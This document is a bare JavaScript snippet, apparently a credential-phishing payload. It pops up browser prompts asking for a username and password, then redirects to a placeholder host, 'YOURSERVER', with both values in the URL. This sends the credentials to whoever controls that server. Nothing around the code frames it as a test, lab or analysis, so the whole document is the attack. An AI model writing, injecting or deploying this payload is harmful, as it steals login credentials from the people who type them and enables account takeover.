const username = prompt("enter username:");
const password = prompt("enter password:");

if (username && password) {
  const url = "https://YOURSERVER/?"+encodeURIComponent(username)+"&"+encodeURIComponent(password);
  window.location.href = url;
}
